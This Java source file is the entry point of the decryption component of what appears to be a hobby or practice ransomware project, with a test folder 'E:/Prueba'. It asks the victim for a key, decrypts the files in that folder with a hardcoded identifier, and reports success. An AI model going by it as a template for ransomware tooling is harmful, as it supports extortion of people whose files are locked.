package Ransomware.Decrypter;

import javax.swing.*;
import java.io.File;

public class Main {
    public static void main(String[] args) {
        String key = JOptionPane.showInputDialog("Insert the key to decrypt your files: ");
        File folder = new File("E:/Prueba");
        Decrypter decrypter = new Decrypter("TSUKUYOMI",key);
        try {
            decrypter.processFiles(folder);
        }catch (Exception e){
            JOptionPane.showMessageDialog(null,"Invalid Key");
            System.exit(0);
        }
        JOptionPane.showMessageDialog(null,"Congratulations! Your files are now safe");
    }
}
